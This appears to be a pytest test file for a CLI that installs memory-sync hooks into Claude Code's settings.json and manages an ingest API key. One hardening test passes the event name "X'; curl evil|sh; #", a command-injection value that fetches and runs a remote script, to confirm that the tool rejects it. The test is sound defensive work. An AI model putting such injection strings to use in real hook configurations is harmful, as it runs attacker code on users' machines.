"""Tests del merge idempotente de ~/.claude/settings.json (install/status/uninstall)."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import httpx
import pytest
from typer.testing import CliRunner

from focusyn_cli import config as cfg
from focusyn_cli import hooks as h
from focusyn_cli.cli import app
from focusyn_cli.config import Credential
from focusyn_cli.http import GatewayClient

_FAKE_BIN = "/home/user/.local/bin/focusyn"


@pytest.fixture(autouse=True)
def _fake_binary(monkeypatch: pytest.MonkeyPatch) -> None:
    """resolve_binary() → un shim estable fijo (no depende del PATH real de la máquina de test)."""
    monkeypatch.setattr("focusyn_cli.hooks.shutil.which", lambda _name: _FAKE_BIN)


@pytest.fixture()
def claude_dir(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(tmp_path))
    return tmp_path


def _write_settings(claude_dir: Path, data: dict[str, Any]) -> Path:
    path = claude_dir / "settings.json"
    path.write_text(json.dumps(data, indent=2), encoding="utf-8")
    return path


def _read_settings(claude_dir: Path) -> dict[str, Any]:
    data: dict[str, Any] = json.loads((claude_dir / "settings.json").read_text(encoding="utf-8"))
    return data


def test_install_en_settings_vacio(claude_dir: Path) -> None:
    result = h.install()
    assert not result.dry_run
    data = _read_settings(claude_dir)
    assert set(data["hooks"].keys()) == {"SessionEnd", "PreCompact"}
    cmd = data["hooks"]["SessionEnd"][0]["hooks"][0]["command"]
    assert _FAKE_BIN in cmd
    assert "memory sync --quiet" in cmd
    assert data["hooks"]["SessionEnd"][0]["hooks"][0]["async"] is True


def test_install_preserva_claves_ajenas(claude_dir: Path) -> None:
    _write_settings(
        claude_dir,
        {
            "permissions": {"allow": ["mcp__x__y"]},
            "theme": "dark",
            "hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "otra-cosa"}]}]},
        },
    )
    h.install()
    data = _read_settings(claude_dir)
    # lo ajeno intacto
    assert data["permissions"] == {"allow": ["mcp__x__y"]}
    assert data["theme"] == "dark"
    assert data["hooks"]["SessionStart"][0]["hooks"][0]["command"] == "otra-cosa"
    # lo nuestro agregado
    assert "SessionEnd" in data["hooks"]


def test_install_migra_el_legacy_con_key_inline(claude_dir: Path) -> None:
    legacy = (
        "{ date '+[SessionEnd %F %T]'; FOCUSYN_INGEST_KEY=a2a_SECRETO "
        "/home/x/.local/bin/uv run --project /x focusyn memory sync; } >> /x/log 2>&1"
    )
    _write_settings(
        claude_dir,
        {
            "hooks": {
                "SessionEnd": [{"hooks": [{"type": "command", "command": legacy, "async": True}]}]
            }
        },
    )
    result = h.install()
    assert result.removed_legacy == 1
    data = _read_settings(claude_dir)
    handlers = data["hooks"]["SessionEnd"][0]["hooks"]
    # un solo handler (el nuestro), sin la key inline
    assert len(handlers) == 1
    assert "a2a_SECRETO" not in handlers[0]["command"]
    assert "memory sync --quiet" in handlers[0]["command"]


def test_install_es_idempotente(claude_dir: Path) -> None:
    h.install()
    h.install()
    data = _read_settings(claude_dir)
    # no se duplica: un solo handler nuestro por evento
    assert len(data["hooks"]["SessionEnd"][0]["hooks"]) == 1
    ours = [g for g in data["hooks"]["SessionEnd"] if "memory sync" in g["hooks"][0]["command"]]
    assert len(ours) == 1


def test_install_hace_backup(claude_dir: Path) -> None:
    _write_settings(claude_dir, {"theme": "dark"})
    result = h.install()
    assert result.backup_path is not None
    assert result.backup_path.exists()
    assert json.loads(result.backup_path.read_text())["theme"] == "dark"


def test_dry_run_no_escribe(claude_dir: Path) -> None:
    _write_settings(claude_dir, {"theme": "dark"})
    result = h.install(dry_run=True)
    assert result.dry_run
    # el archivo sigue sin hooks
    assert "hooks" not in _read_settings(claude_dir)


def test_install_solo_sessionend(claude_dir: Path) -> None:
    h.install(("SessionEnd",))
    data = _read_settings(claude_dir)
    assert "SessionEnd" in data["hooks"]
    assert "PreCompact" not in data["hooks"]


def test_current_lista_los_nuestros(claude_dir: Path) -> None:
    h.install()
    installed = h.current()
    events = {e for e, _ in installed}
    assert events == {"SessionEnd", "PreCompact"}


def test_uninstall_quita_los_nuestros_y_deja_lo_ajeno(claude_dir: Path) -> None:
    _write_settings(
        claude_dir,
        {"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "ajeno"}]}]}},
    )
    h.install()
    result = h.uninstall()
    assert result.removed_legacy == 2  # SessionEnd + PreCompact
    data = _read_settings(claude_dir)
    # lo ajeno sobrevive; lo nuestro se fue
    assert data["hooks"]["SessionStart"][0]["hooks"][0]["command"] == "ajeno"
    assert "SessionEnd" not in data["hooks"]
    assert h.current() == []


def test_build_command_no_lleva_la_key(claude_dir: Path) -> None:
    cmd = h.build_command(_FAKE_BIN, "SessionEnd")
    assert "a2a_" not in cmd
    assert "FOCUSYN_INGEST_KEY" not in cmd
    assert cmd.startswith("{ date")
    assert f"{_FAKE_BIN} memory sync --quiet" in cmd


def test_resolve_binary_falla_sin_shim(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("focusyn_cli.hooks.shutil.which", lambda _name: None)
    monkeypatch.setattr("focusyn_cli.hooks.Path.is_file", lambda self: False)
    with pytest.raises(FileNotFoundError):
        h.resolve_binary()


# --------------------------------------------------------------------------- #
# Hardening: lo que se escribe en settings.json lo EJECUTA un shell
# --------------------------------------------------------------------------- #


def test_build_command_quotea_el_binario(claude_dir: Path) -> None:
    """Un $HOME con espacios partía el comando en dos y el hook fallaba en silencio (es async)."""
    cmd = h.build_command("/home/mi usuario/.local/bin/focusyn", "SessionEnd")
    assert "'/home/mi usuario/.local/bin/focusyn' memory sync --quiet" in cmd


def test_build_command_nunca_falla_el_hook(claude_dir: Path) -> None:
    """El hook debe salir 0 SIEMPRE: ``memory sync`` sale 3 cuando hay conflictos.

    Sin el ``|| true``, un conflicto (algo que decidir, no un fallo) haría que el
    ``PreCompact`` devolviera ≠ 0 y **bloqueara la compactación** del contexto.
    """
    cmd = h.build_command(_FAKE_BIN, "PreCompact")
    assert "memory sync --quiet || true" in cmd


def test_install_rechaza_un_evento_desconocido(claude_dir: Path) -> None:
    """`--events` es input del usuario y acaba DENTRO de un comando de shell: lista blanca.

    Sin esto, `--events "X'; curl evil|sh; #"` dejaba escrito un comando arbitrario en
    settings.json que corre solo al cerrar cada sesión.
    """
    with pytest.raises(ValueError, match="desconocido"):
        h.install(events=("SessionEnd", "X'; curl evil|sh; #"))
    assert not (claude_dir / "settings.json").exists()  # no escribió nada


# --------------------------------------------------------------------------- #
# GOTCHA 2: la key ingest del hook — `hooks install` no debe dejar el sync roto en silencio
# --------------------------------------------------------------------------- #

runner = CliRunner()


@pytest.fixture()
def cli_env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """settings.json + config.toml aislados; sin FOCUSYN_* del shell contaminando la resolución."""
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(tmp_path / "claude"))
    monkeypatch.setenv("FOCUSYN_CONFIG", str(tmp_path / "config.toml"))
    for k in ("FOCUSYN_INGEST_KEY", "FOCUSYN_API_KEY", "FOCUSYN_APPLY_KEY", "FOCUSYN_GATEWAY_URL"):
        monkeypatch.delenv(k, raising=False)
    return tmp_path


def _seed_login_profile(url: str = "https://gw") -> None:
    """Simula `focusyn login`: perfil default con JWT (sin api_key) — el caso roto de la F2."""
    cfg.save_config(
        cfg.Config(profiles={"default": Credential(gateway_url=url, access_token="jwt.tok")})
    )


def test_cli_install_con_jwt_avisa_que_falta_la_key_ingest(cli_env: Path) -> None:
    """`login` (JWT) + `hooks install` a secas → los hooks se escriben, pero se AVISA (ruidoso)."""
    _seed_login_profile()
    result = runner.invoke(app, ["hooks", "install"])
    assert result.exit_code == 0, result.stdout
    assert "hooks instalados" in result.stdout
    # el aviso va a stderr (no rompe, pero no es callado)
    assert "scope 'ingest'" in result.stderr
    assert "--emit-ingest-key" in result.stderr


def test_cli_install_ingest_key_lo_guarda_y_no_avisa(cli_env: Path) -> None:
    _seed_login_profile()
    result = runner.invoke(app, ["hooks", "install", "--ingest-key", "a2a_ing"])
    assert result.exit_code == 0, result.stdout
    assert "key ingest guardada" in result.stdout
    assert cfg.load_config().ingest_key == "a2a_ing"
    # con la key guardada el preflight no avisa
    assert "scope 'ingest'" not in result.stderr


def test_cli_install_ingest_key_guion_la_pide_oculta(
    cli_env: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _seed_login_profile()
    monkeypatch.setattr("focusyn_cli.cli.getpass.getpass", lambda _p="": " a2a_pegada ")
    result = runner.invoke(app, ["hooks", "install", "--ingest-key", "-"])
    assert result.exit_code == 0, result.stdout
    assert cfg.load_config().ingest_key == "a2a_pegada"  # con .strip()
    assert "a2a_pegada" not in result.stdout  # jamás en la salida


def _emit_gateway(
    monkeypatch: pytest.MonkeyPatch, *, scopes: list[str]
) -> None:
    """Mockea session.client_for → gateway de mentira (whoami + POST /v1/agents)."""
    cred = Credential(gateway_url="https://gw", access_token="jwt.tok")

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path == "/v1/auth/whoami":
            return httpx.Response(200, json={"principal": "user:alice", "scopes": scopes})
        if request.url.path == "/v1/agents" and request.method == "GET":
            return httpx.Response(200, json={"agents": []})
        if request.url.path == "/v1/agents" and request.method == "POST":
            return httpx.Response(201, json={"agent_id": "memory-host", "api_key": "a2a_ing_nueva"})
        return httpx.Response(404, json={"error": "no"})

    def _client_for(*_a: object, **_k: object) -> GatewayClient:
        return GatewayClient(cred, transport=httpx.MockTransport(handler))

    monkeypatch.setattr("focusyn_cli.session.client_for", _client_for)


def test_cli_install_emit_ingest_key_emite_y_guarda(
    cli_env: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _seed_login_profile()
    _emit_gateway(monkeypatch, scopes=["read", "ingest"])
    result = runner.invoke(app, ["hooks", "install", "--emit-ingest-key", "--name", "memory-host"])
    assert result.exit_code == 0, result.stdout
    assert "key ingest emitida" in result.stdout
    assert cfg.load_config().ingest_key == "a2a_ing_nueva"
    assert "a2a_ing_nueva" not in result.stdout  # jamás en la salida
    assert "scope 'ingest'" not in result.stderr  # preflight OK


def test_cli_install_emit_sin_scope_ingest_falla_claro(
    cli_env: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """No-escalada: un usuario sin scope 'ingest' no puede auto-emitir la key → error accionable."""
    _seed_login_profile()
    _emit_gateway(monkeypatch, scopes=["read", "propose", "apply", "sync"])
    result = runner.invoke(app, ["hooks", "install", "--emit-ingest-key"])
    assert result.exit_code == 2
    assert "no tiene el scope 'ingest'" in result.stderr
    assert cfg.load_config().ingest_key is None  # no guardó nada


def test_cli_install_dry_run_no_toca_config_ni_settings(cli_env: Path) -> None:
    _seed_login_profile()
    result = runner.invoke(app, ["hooks", "install", "--ingest-key", "a2a_x", "--dry-run"])
    assert result.exit_code == 0, result.stdout
    assert cfg.load_config().ingest_key is None  # no persistió la key
    assert not (cli_env / "claude" / "settings.json").exists()  # ni los hooks


def test_default_ingest_agent_name_prefijo_memory(monkeypatch: pytest.MonkeyPatch) -> None:
    from focusyn_cli import cli as cli_mod

    monkeypatch.setattr("focusyn_cli.mcp.socket.gethostname", lambda: "Mi-Host")
    assert cli_mod._default_ingest_agent_name() == "memory-mi-host"


def _doctor_stubs(monkeypatch: pytest.MonkeyPatch) -> None:
    """Neutraliza la red de `doctor` (URL + versión) para aislar el chequeo de hooks."""
    monkeypatch.setattr("focusyn_cli.cli.check_url", lambda cred, **k: {"api_version": "1"})
    monkeypatch.setattr("focusyn_cli.cli.version_warning", lambda caps: None)


def test_cli_doctor_avisa_si_hooks_sin_ingest_key(
    cli_env: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # Perfil sólo-URL (sin secreto) + hooks instalados + sin key ingest → doctor avisa.
    cfg.save_config(cfg.Config(profiles={"default": Credential(gateway_url="https://gw")}))
    h.install()
    _doctor_stubs(monkeypatch)
    result = runner.invoke(app, ["doctor"])
    assert result.exit_code == 0, result.output
    assert "hooks de memory sync" in result.stdout
    assert "sin API key 'ingest'" in result.stdout


def test_cli_doctor_ok_con_ingest_key(cli_env: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    cfg.save_config(
        cfg.Config(
            profiles={"default": Credential(gateway_url="https://gw")}, ingest_key="a2a_ing"
        )
    )
    h.install()
    _doctor_stubs(monkeypatch)
    result = runner.invoke(app, ["doctor"])
    assert result.exit_code == 0, result.output
    assert "credencial ingest para el hook: presente" in result.stdout
